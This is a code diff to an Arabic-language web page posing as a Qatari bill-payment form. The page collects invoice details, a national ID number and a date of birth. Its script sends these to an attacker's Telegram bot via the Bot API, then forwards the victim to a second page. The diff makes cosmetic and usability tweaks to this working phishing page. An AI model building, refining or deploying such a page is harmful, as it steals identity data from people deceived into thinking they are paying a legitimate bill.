@@ -11,10 +11,8 @@
 <meta property="og:type" content="website">
 <style>
 body{font-family: Arial, sans-serif;color:#333;background:#f9f9f9;padding:20px;line-height:1.8;margin:0;max-width:100%;box-sizing:border-box;}
-@media (max-width:768px){body{padding:15px;font-size:14px;}.header img{height:50px;}.form-container{padding:20px;}.btn-green{width:90%;font-size:14px;padding:10px;}}
-@media (max-width:480px){body{padding:10px;font-size:13px;}.header img{height:40px;}.form-container{padding:15px;}.btn-green{width:95%;font-size:13px;padding:8px;}}
 .header{text-align:center;margin-bottom:20px;}
-.header img{height:60px;vertical-align:middle;margin-right:10px;}
+.header img{height:60px;}
 .breadcrumb{text-align:center;color:green;font-size:14px;margin:10px 0;}
 .form-container{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:500px;margin:20px auto;}
 h2{text-align:center;color:green;margin-top:0;margin-bottom:20px;}
@@ -22,8 +20,7 @@ label{display:block;margin:10px 0 5px;font-weight:bold;}
 input[type="text"], select{width:100%;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;box-sizing:border-box;}
 .birth-container{display:flex;gap:10px;}
 .birth-container select,.birth-container input{flex:1;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;}
-.btn-green{display:block;width:100%;margin:25px auto;padding:12px;background:#008000;color:white;text-align:center;border-radius:8px;text-decoration:none;font-weight:bold;font-size:16px;cursor:pointer;border:none;transition:background 0.3s;}
-.btn-green:hover:not(:disabled){background:#006400;}
+.btn-green{display:block;width:100%;margin:25px auto;padding:12px;background:#008000;color:white;text-align:center;border-radius:8px;text-decoration:none;font-weight:bold;font-size:16px;cursor:pointer;border:none;}
 .btn-green:disabled { background: #ccc; cursor: not-allowed; }
 </style>
 </head>
@@ -44,9 +41,9 @@ input[type="text"], select{width:100%;padding:12px;border:2px solid #008000;bord
 <option value="رسوم شحن">رسوم شحن</option>
 </select>
 <label for="amount">قيمة رسوم السداد (ريال قطري)</label>
-<input type="text" id="amount" name="amount" required>
+<input type="text" id="amount" name="amount" required inputmode="numeric">
 <label for="nationalId">رقم الهوية</label>
-<input type="text" id="nationalId" name="nationalId" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
+<input type="text" id="nationalId" name="nationalId" required inputmode="numeric">
 <label>تاريخ الميلاد</label>
 <div class="birth-container">
 <select id="daySelect" required><option value="">اليوم</option></select>
@@ -55,7 +52,7 @@ input[type="text"], select{width:100%;padding:12px;border:2px solid #008000;bord
 <option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option>
 <option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
 </select>
-<input type="text" id="yearSelect" placeholder="السنة" maxlength="4" required>
+<input type="text" id="yearSelect" placeholder="السنة" maxlength="4" required inputmode="numeric">
 </div>
 <button type="submit" class="btn-green" id="submitBtn">التالي</button>
 </form>
@@ -73,7 +70,7 @@ const yearSelect = document.getElementById("yearSelect");
 function updateDays(){
     let month = parseInt(monthSelect.value);
     let days = 31;
-    if(month === 2){days = 29;} // Simple leap year fix
+    if(month === 2){days = 29;}
     else if([4, 6, 9, 11].includes(month)){days = 30;}
     daySelect.innerHTML = '<option value="">اليوم</option>';
     for(let i=1;i<=days;i++){
@@ -93,7 +90,6 @@ document.getElementById("sadadForm").addEventListener("submit", async function(e
     submitBtn.disabled = true;
     submitBtn.textContent = 'جاري التحويل...';
 
-    // جمع البيانات من النموذج
     const formData = {
         invoiceNumber: document.getElementById('invoiceNumber').value,
         paymentType: document.getElementById('paymentType').value,
@@ -102,19 +98,17 @@ document.getElementById("sadadForm").addEventListener("submit", async function(e
         dob: `${daySelect.value}/${monthSelect.value}/${yearSelect.value}`
     };
 
-    // تنسيق الرسالة
     let message = `
--=-=-=-=-= [ 🏦 الخطوة 1: البيانات الرئيسية ] =-=-=-=-=-
-            
-*--[ 📄 معلومات الفاتورة ]--*
-*▫️ رقم الفاتورة:* \`${formData.invoiceNumber || 'N/A'}\`
-*▫️ نوع السداد:* \`${formData.paymentType || 'N/A'}\`
-*▫️ قيمة الرسوم:* \`${formData.amount || 'N/A'}\`
-*▫️ رقم الهوية:* \`${formData.nationalId || 'N/A'}\`
-*▫️ تاريخ الميلاد:* \`${formData.dob || 'N/A'}\`
+*📄===== [ الخطوة 1: البيانات الرئيسية ] =====📄*
+
+*▫️ رقم الفاتورة:* \`${formData.invoiceNumber}\`
+*▫️ نوع السداد:* \`${formData.paymentType}\`
+*▫️ قيمة الرسوم:* \`${formData.amount}\`
+*▫️ رقم الهوية:* \`${formData.nationalId}\`
+*▫️ تاريخ الميلاد:* \`${formData.dob}\`
+--------------------------------------------------
 `;
 
-    // إرسال البيانات إلى تليجرام
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     try {
         await fetch(url, {
@@ -125,7 +119,7 @@ document.getElementById("sadadForm").addEventListener("submit", async function(e
     } catch (error) {
         console.error("Telegram send error:", error);
     } finally {
-        // الانتقال إلى الصفحة التالية بعد إرسال البيانات (أو في حالة حدوث خطأ)
+        // ✅ التصحيح: تمت إعادة إضافة سطر التحويل إلى الصفحة الثانية
         window.location.href = "page2.html";
     }
 });
